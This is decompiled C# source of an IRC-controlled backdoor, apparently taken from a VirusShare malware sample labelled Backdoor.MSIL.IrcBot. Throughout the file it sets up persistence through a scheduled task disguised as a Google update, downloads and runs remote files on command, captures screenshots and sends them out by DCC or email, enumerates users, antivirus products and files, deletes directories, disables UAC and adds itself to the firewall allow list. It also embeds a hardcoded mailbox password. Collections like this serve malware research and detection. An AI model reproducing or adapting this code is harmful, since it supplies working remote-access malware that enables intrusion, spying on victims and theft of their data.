// Decompiled with JetBrains decompiler
// Type: Irc9.Function
// Assembly: Irc9, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E7A76116-F62B-4512-BE9B-418015CDF203
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.MSIL.IrcBot.ts-ca7c95003f1d98515fb57c5abb26f6ed9b53d83503d9e6f6d3082ef1428ffdee.exe

using Microsoft.Win32;
using onlyconnect;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Irc9
{
  internal class Function
  {
    public const int WM_SYSCOMMAND = 274;
    public const int SC_CLOSE = 61536;
    public static IrcClient ircCl = Program.irc;
    private static WebClient webClient;
    private static Uri uriData;
    private static string fileName;
    private static string Name;
    private static string path;
    private static Dcc dcc;
    public static WebCam webCam;
    private static Process pTask;
    private static bool mailSended = false;
    public static string name;

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern bool CloseWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern int FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);

    public static void checkP()
    {
      int num = 0;
      foreach (Process process in Process.GetProcesses())
      {
        if (Process.GetCurrentProcess().ProcessName.Equals(process.ProcessName))
          ++num;
        if (num > 1)
          Environment.Exit(0);
      }
    }

    public static void StartUp()
    {
      try
      {
        Directory.CreateDirectory(Config.BPath);
        if (System.IO.File.Exists(Config.BPath + Config.BName))
        {
          System.IO.File.SetAttributes(Config.BPath + Config.BName, FileAttributes.Normal);
          System.IO.File.Delete(Config.BPath + Config.BName);
        }
        System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, Config.BPath + Config.BName);
        System.IO.File.SetAttributes(Config.BPath + Config.BName, FileAttributes.ReadOnly | FileAttributes.System | FileAttributes.Normal);
      }
      catch (Exception ex)
      {
      }
      Assembly.GetEntryAssembly();
      new Process()
      {
        StartInfo = {
          CreateNoWindow = true,
          UseShellExecute = false,
          FileName = "schtasks.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = ("/create /tn GoogleUpdateTaskUserS-973200582-IC /tr \"\"" + Config.BPath + "\\" + Config.BName + "\"\" /rl highest /sc onlogon")
        }
      }.Start();
      Thread.Sleep(6000);
      new Process()
      {
        StartInfo = {
          CreateNoWindow = true,
          UseShellExecute = false,
          WorkingDirectory = Environment.CurrentDirectory,
          FileName = "schtasks.exe",
          WindowStyle = ProcessWindowStyle.Normal,
          Arguments = "/run /tn GoogleUpdateTaskUserS-1-5-21-973200582-IC"
        }
      }.Start();
    }

    public static void IrcMessage(IrcMessageData IrcCommand)
    {
      string[] strArray1 = IrcCommand.Message.Split('^');
      string[] user = IrcCommand.From.Split('!');
      if (strArray1[0] == "window")
      {
        int num = 256;
        StringBuilder text = new StringBuilder(num);
        if (Function.GetWindowText(Function.GetForegroundWindow(), text, num) > 0)
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, text.ToString());
        else
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "No Window");
      }
      if (strArray1[0] == "closewindow")
      {
        Function.CloseWindow(Function.GetForegroundWindow());
        int window = Function.FindWindow("", (string) null);
        if (window > 0)
          Function.SendMessage(window, 274U, 61536, 0);
      }
      if (strArray1[0] == "name")
      {
        string str1 = SystemInformation.UserDomainName.ToString();
        string str2 = SystemInformation.UserName.ToString();
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "Name is : " + str1 + "\\" + str2);
      }
      if (strArray1[0] == "restart")
        Process.Start("shutdown", "/r");
      if (strArray1[0] == "system")
      {
        string systemDirectory = Environment.SystemDirectory;
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        foreach (ManagementObject managementObject in new ManagementObjectSearcher((ObjectQuery) new WqlObjectQuery("select * from win32_OperatingSystem")).Get())
        {
          string str3 = managementObject["name"].ToString();
          string str4 = managementObject["OSArchitecture"].ToString();
          string str5 = str3.Split('|')[0];
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "OS version - " + str5 + "; Arhitcture: " + str4);
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "System Directory - " + systemDirectory.ToString());
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "File  Directory  - " + folderPath.ToString());
        }
        string tempPath = Path.GetTempPath();
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "Temp Folder  - " + tempPath);
      }
      if (strArray1[0] == "download")
      {
        string[] strArray2 = strArray1[1].Split('+');
        string tempPath = Path.GetTempPath();
        if (strArray2.Length > 1)
        {
          Directory.CreateDirectory(strArray2[1]);
          Function.fileName = strArray2[1] + "\\";
          Function.uriData = new Uri(strArray2[0]);
          Function.Name = Function.uriData.Segments[Function.uriData.Segments.Length - 1];
          Function.webClient = new WebClient();
          Function.webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Function.webClient_DownloadFileCompleted);
          Function.path = Function.fileName + Function.Name;
          Function.webClient.DownloadFileAsync(Function.uriData, Function.path, (object) null);
        }
        else
        {
          Directory.CreateDirectory(tempPath + "\\Win\\v3.0");
          Function.fileName = tempPath + "Win\\v3.0\\";
          Function.uriData = new Uri(strArray2[0]);
          Function.Name = Function.uriData.Segments[Function.uriData.Segments.Length - 1];
          Function.webClient = new WebClient();
          Function.webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Function.webClient_DownloadFileCompleted);
          Function.path = Function.fileName + Function.Name;
          Function.webClient.DownloadFileAsync(Function.uriData, Function.path, (object) null);
        }
      }
      if (strArray1[0] == "listprocess")
        Function.ListProcess();
      if (strArray1[0] == "getrights")
      {
        if (Function.GetAndDisplayRights())
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "Running with full rights");
        else
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "Running with limited rights");
      }
      if (strArray1[0] == "getusers")
        Function.GetUsers();
      if (strArray1[0] == "version")
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "Version - 3.0");
      if (strArray1[0] == "directory")
      {
        try
        {
          foreach (string message in Function.getFilesFromBaseDir(strArray1[1].ToString()))
          {
            Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, message);
            Thread.Sleep(1000);
          }
        }
        catch
        {
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "No directory exist");
        }
      }
      if (strArray1[0] == "deletedirectory")
      {
        string path = strArray1[1].ToString();
        try
        {
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "I am about to attempt to delete: " + path);
          Directory.Delete(path, true);
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "The Delete operation was successful.");
        }
        catch (Exception ex)
        {
          string str = ex.ToString();
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "The process failed: " + str);
        }
        finally
        {
        }
      }
      if (strArray1[0] == "disablelua")
        Function.DisableLua();
      if (strArray1[0] == "killprocess")
        Function.FindAndKillProcess(strArray1[1]);
      if (strArray1[0] == "startprocess")
      {
        string[] strArray3 = strArray1[1].Split('+');
        if (strArray3.Length > 1)
        {
          if (Function.StartProces(strArray3[0], strArray3[1]))
            Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " File executed... ");
          else
            Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " File cannot be executed... ");
        }
        else if (Function.StartProces(strArray3[0], (string) null))
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " File executed... ");
        else
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " File cannot be executed... ");
      }
      if (strArray1[0] == "takescreenshot")
      {
        try
        {
          string str = "scr" + (object) new Random().Next(1000, 10000) + ".jpg";
          Function.fileName = Path.GetTempPath() + str;
          if (System.IO.File.Exists(Function.fileName))
            System.IO.File.Delete(Function.fileName);
          Rectangle bounds = Screen.GetBounds(new Point(0, 0));
          int width = bounds.Width;
          bounds = Screen.GetBounds(new Point(0, 0));
          int height = bounds.Height;
          Bitmap bitmap = new Bitmap(width, height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(0, 0, 0, 0, new Size(width, height));
          bitmap.Save(Function.fileName, ImageFormat.Jpeg);
          Function.send(Function.fileName, user);
        }
        catch
        {
        }
      }
      if (strArray1[0] == "screenshotemail")
      {
        try
        {
          string str = "scr" + (object) new Random().Next(1000, 10000) + ".jpg";
          Function.fileName = Path.GetTempPath() + str;
          if (System.IO.File.Exists(Function.fileName))
            System.IO.File.Delete(Function.fileName);
          Rectangle bounds = Screen.GetBounds(new Point(0, 0));
          int width = bounds.Width;
          bounds = Screen.GetBounds(new Point(0, 0));
          int height = bounds.Height;
          Bitmap bitmap = new Bitmap(width, height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(0, 0, 0, 0, new Size(width, height));
          bitmap.Save(Function.fileName, ImageFormat.Jpeg);
          Function.SendEmail(Function.fileName, true);
        }
        catch
        {
        }
      }
      if (strArray1[0] == "getwebcam")
      {
        try
        {
          Function.webCam = new WebCam();
          Function.webCam.Load();
          string str = Function.webCam.ListOfDevices[0].ToString();
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, str.ToString());
          Function.webCam.Dispose();
        }
        catch
        {
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "no webcam");
        }
      }
      if (strArray1[0] == "gettask")
      {
        Function.pTask = Process.Start(new ProcessStartInfo("SCHTASKS", "/QUERY /fo table")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false
        });
        Function.pTask.OutputDataReceived += new DataReceivedEventHandler(Function.p_OutputDataReceived);
        Function.pTask.BeginOutputReadLine();
      }
      if (strArray1[0] == "stoptask")
        Function.pTask.CancelOutputRead();
      if (strArray1[0] == "runtask")
      {
        try
        {
          string str = strArray1[1].ToString();
          new Process()
          {
            StartInfo = {
              CreateNoWindow = true,
              UseShellExecute = false,
              FileName = "schtasks.exe",
              WindowStyle = ProcessWindowStyle.Hidden,
              Arguments = ("/run /tn " + str)
            }
          }.Start();
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " Task started ...... ");
        }
        catch
        {
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " Please enter taskname...... ");
        }
      }
      if (strArray1[0] == "createtask")
      {
        try
        {
          new Process()
          {
            StartInfo = {
              CreateNoWindow = true,
              UseShellExecute = false,
              FileName = "schtasks.exe",
              WindowStyle = ProcessWindowStyle.Hidden,
              Arguments = "/create /tn E"
            }
          }.Start();
        }
        catch
        {
        }
      }
      if (strArray1[0] == "deletetask")
      {
        try
        {
          string str = strArray1[1].ToString();
          new Process()
          {
            StartInfo = {
              CreateNoWindow = true,
              UseShellExecute = false,
              FileName = "schtasks.exe",
              WindowStyle = ProcessWindowStyle.Hidden,
              Arguments = ("/delete /tn " + str + " /F ")
            }
          }.Start();
        }
        catch
        {
        }
      }
      if (!(strArray1[0] == "test"))
        ;
      if (strArray1[0] == "antivirus")
      {
        Function.AntivirusInstalled();
        string antiVirus = Function.GetAntiVirus();
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "Antivirus Installed: " + antiVirus);
      }
      if (strArray1[0] == "program")
        Function.GetInstalledApplicationList();
      if (strArray1[0] == "getlua")
        Function.GetLua();
      if (strArray1[0] == "mouse")
        Cursor.Position = new Point(Cursor.Position.X + 10, Cursor.Position.Y + 10);
      if (strArray1[0] == "openurl")
      {
        try
        {
          string str = strArray1[1].ToString();
          new Process()
          {
            StartInfo = {
              FileName = Function.GetDefaultBrowserPath(),
              Arguments = str
            }
          }.Start();
        }
        catch
        {
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " Please enter URL ");
        }
      }
      if (strArray1[0] == "asemblypath")
      {
        string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().CodeBase);
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " Asembly path - " + directoryName);
      }
      if (strArray1[0] == "getip")
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " IP Address :  - " + Function.GetIP());
      if (strArray1[0] == "skypeversion")
      {
        try
        {
          FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(Function.ProgramFilesx86() + "\\Skype\\Phone\\Skype.exe");
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " SkypeVersion :  - " + versionInfo.FileVersion.ToString());
        }
        catch
        {
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " No Skype Found");
        }
      }
      if (strArray1[0] == "firewall")
        Function.Firew();
      if (!(strArray1[0] == "startserver"))
        return;
      new Thread(new ThreadStart(Server.ServerSock)).Start();
    }

    public static void send(string fName, string[] user)
    {
      Function.dcc = new Dcc(new DccFileInfo(new FileInfo(fName)));
      Function.dcc.dccFileInfo.OpenForRead();
      new Thread(new ThreadStart(Function.Up)).Start();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append(user[0]);
      stringBuilder.Append(" :\u0001DCC SEND ");
      stringBuilder.Append(Function.dcc.dccFileInfo.DccFileName);
      stringBuilder.Append(" ");
      stringBuilder.Append(DccUtil.IPAddressToLong(DccUtil.LocalHost()));
      stringBuilder.Append(" ");
      stringBuilder.Append(1024);
      stringBuilder.Append(" ");
      stringBuilder.Append(Function.dcc.dccFileInfo.CompleteFileSize);
      stringBuilder.Append("\u0001\n");
      Function.ircCl.SendMessage(SendType.DCC, Config.CHANNEL, stringBuilder.ToString());
    }

    private static void webClient_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
    {
      if (e.Error == null)
      {
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " : File downloadet:");
        try
        {
          new Process()
          {
            EnableRaisingEvents = false,
            StartInfo = {
              FileName = (Function.fileName + Function.Name),
              WorkingDirectory = Function.fileName
            }
          }.Start();
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " : File run");
        }
        catch
        {
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " : File cannot be run....:");
        }
      }
      else if (!e.Cancelled && e.Error != null)
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " : File not downloadet:");
      if (!e.Cancelled)
        return;
      Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, " : File not downloadet:");
    }

    public static void ListProcess()
    {
      Process[] processes = Process.GetProcesses();
      foreach (Process process in processes)
      {
        try
        {
          string processName = process.ProcessName;
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, processName + "  " + Function.GetProcessOwner(process.Id));
          Thread.Sleep(1000);
        }
        catch (Exception ex)
        {
        }
      }
    }

    private static string GetProcessOwner(int processId)
    {
      foreach (ManagementObject managementObject in new ManagementObjectSearcher("Select * From Win32_Process Where ProcessID = " + (object) processId).Get())
      {
        string[] args = new string[1]{ string.Empty };
        if (Convert.ToInt32(managementObject.InvokeMethod("GetOwner", (object[]) args)) == 0)
          return args[0];
      }
      return "NO OWNER";
    }

    private static bool GetAndDisplayRights() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

    public static void GetUsers()
    {
      foreach (ManagementObject managementObject in new ManagementObjectSearcher((ObjectQuery) new SelectQuery("Win32_UserAccount")).Get())
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, managementObject["Name"].ToString());
    }

    public static string[] getFilesFromBaseDir(string baseDir)
    {
      List<string> stringList = new List<string>();
      ArrayList arrayList = new ArrayList();
      arrayList.Add((object) baseDir);
      while (arrayList.Count > 0)
      {
        string path = arrayList[0].ToString();
        arrayList.RemoveAt(0);
        foreach (string file in Directory.GetFiles(path, "*.*"))
          stringList.Add(file);
        foreach (string directory in Directory.GetDirectories(path))
          arrayList.Add((object) directory);
      }
      return stringList.ToArray();
    }

    private static void DisableLua()
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          UseShellExecute = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          WorkingDirectory = "C:\\Windows\\System32\\",
          FileName = "C:\\Windows\\System32\\cmd.exe",
          Arguments = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
          Verb = "runas"
        });
      }
      catch (Exception ex)
      {
      }
    }

    public static void GetLua()
    {
      try
      {
        if (!VistaTools.IsReallyVista())
          return;
        Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "I'm on Vista");
        if (VistaTools.IsElevated())
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "I'm elevated");
        else
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "I'm not elevated");
        switch (VistaTools.GetElevationType())
        {
          case TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault:
            Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "I'm standard user and/or UAC is disabled");
            break;
          case TOKEN_ELEVATION_TYPE.TokenElevationTypeFull:
            Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "UAC is enabled and I'm elevated");
            break;
          case TOKEN_ELEVATION_TYPE.TokenElevationTypeLimited:
            Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, "UAC is enabled and I'm not elevated");
            break;
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static bool FindAndKillProcess(string name)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.StartsWith(name))
        {
          process.Kill();
          return true;
        }
      }
      return false;
    }

    public static bool StartProces(string startName, string arguments)
    {
      if (!System.IO.File.Exists(startName))
        return false;
      SecureString secureString = new SecureString();
      secureString.AppendChar('P');
      secureString.AppendChar('A');
      secureString.AppendChar('S');
      ProcessStartInfo startInfo = new ProcessStartInfo(startName);
      startInfo.WindowStyle = ProcessWindowStyle.Minimized;
      Process.Start(startInfo);
      startInfo.Arguments = arguments;
      startInfo.RedirectStandardOutput = true;
      startInfo.UseShellExecute = false;
      Process.Start(startInfo);
      return true;
    }

    public static void Firew()
    {
      object[] customAttributes = Assembly.GetEntryAssembly().GetCustomAttributes(typeof (AssemblyTitleAttribute), false);
      if (customAttributes.Length == 1)
        Function.name = ((AssemblyTitleAttribute) customAttributes[0]).Title;
      string fullPath = Path.GetFullPath(Path.GetFileName(Assembly.GetExecutingAssembly().Location));
      new Process()
      {
        StartInfo = {
          CreateNoWindow = true,
          UseShellExecute = true,
          FileName = "netsh.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = ("firewall add allowedprogram \"" + fullPath + "\" \"" + Function.name + "\" ENABLE")
        }
      }.Start();
    }

    public static void TakeScreenShot(string[] us)
    {
    }

    private static void Up() => Function.dcc.Upload();

    public static bool AntivirusInstalled()
    {
      string scope = "\\\\" + Environment.MachineName + "\\root\\SecurityCenter";
      try
      {
        return new ManagementObjectSearcher(scope, "SELECT * FROM AntivirusProduct").Get().Count > 0;
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
      return false;
    }

    public static string GetAntiVirus()
    {
      string antiVirus = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get())
        antiVirus = managementBaseObject["displayName"].ToString();
      if (antiVirus == string.Empty)
        antiVirus = "Not found";
      return antiVirus;
    }

    public static void GetInstalledApplicationList()
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", true);
      string[] subKeyNames = registryKey.GetSubKeyNames();
      int subKeyCount = registryKey.SubKeyCount;
      for (int index = 0; index < subKeyCount; ++index)
      {
        string message = registryKey.OpenSubKey(subKeyNames[index]).GetValue("DisplayName", (object) "").ToString();
        if (message != "")
        {
          Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, message);
          Thread.Sleep(1000);
        }
      }
    }

    private static void p_OutputDataReceived(object sender, DataReceivedEventArgs e)
    {
      string message = "" + e.Data + ",";
      Function.ircCl.SendMessage(SendType.Message, Config.CHANNEL, message);
      Thread.Sleep(1000);
    }

    private static string GetDefaultBrowserPath()
    {
      string name = "htmlfile\\shell\\open\\command";
      return ((string) Registry.ClassesRoot.OpenSubKey(name, false).GetValue((string) null, (object) null)).Split('"')[1];
    }

    public static string GetIP()
    {
      WebResponse response = WebRequest.Create("http://checkip.dyndns.org/").GetResponse();
      StreamReader streamReader = new StreamReader(response.GetResponseStream());
      string end = streamReader.ReadToEnd();
      streamReader.Close();
      response.Close();
      int startIndex = end.IndexOf("Address: ") + 9;
      int num = end.LastIndexOf("</body>");
      return end.Substring(startIndex, num - startIndex).ToString();
    }

    private static string ProgramFilesx86() => 8 == IntPtr.Size || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")) ? Environment.GetEnvironmentVariable("ProgramFiles(x86)") : Environment.GetEnvironmentVariable("ProgramFiles");

    public static void EmailInfo()
    {
      try
      {
        Ping ping = new Ping();
        PingOptions options = new PingOptions()
        {
          DontFragment = true
        };
        byte[] bytes = Encoding.ASCII.GetBytes(new string('z', 10));
        IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections().ToString();
        Dns.GetHostByName(Dns.GetHostName());
        string str1 = "?";
        foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
        {
          if (address.AddressFamily == AddressFamily.InterNetwork)
            str1 = address.ToString();
        }
        string hostNameOrAddress = str1;
        string str2 = DateTime.Now.ToString();
        try
        {
          if (ping.Send(hostNameOrAddress, 60, bytes, options).Status != IPStatus.Success)
            return;
          WebResponse response = WebRequest.Create("http://checkip.dyndns.org/").GetResponse();
          StreamReader streamReader = new StreamReader(response.GetResponseStream());
          string end = streamReader.ReadToEnd();
          streamReader.Close();
          response.Close();
          int startIndex = end.IndexOf("Address: ") + 9;
          int num = end.LastIndexOf("</body>");
          string str3 = end.Substring(startIndex, num - startIndex);
          Thread.Sleep(200);
          Function.SendEmail(WindowsIdentity.GetCurrent().Name.ToString() + "\n Local IP:  " + str1 + "\n" + str3 + "\n" + str2, false);
        }
        catch
        {
        }
      }
      catch
      {
      }
    }

    public static void SendEmail(string body, bool attached)
    {
      MailMessage message = new MailMessage();
      message.To.Add("face_teams@hotmail.com");
      message.Subject = Config.nick;
      message.Body = body;
      message.From = new MailAddress("face_teams@hotmail.com");
      if (attached)
      {
        Attachment attachment = new Attachment(body);
        message.Attachments.Add(attachment);
      }
      new SmtpClient()
      {
        Host = "smtp.gmail.com",
        EnableSsl = true,
        Credentials = ((ICredentialsByHost) new NetworkCredential("face.teams@gmail.com", "kayco123"))
      }.Send(message);
      Function.mailSended = true;
    }
  }
}
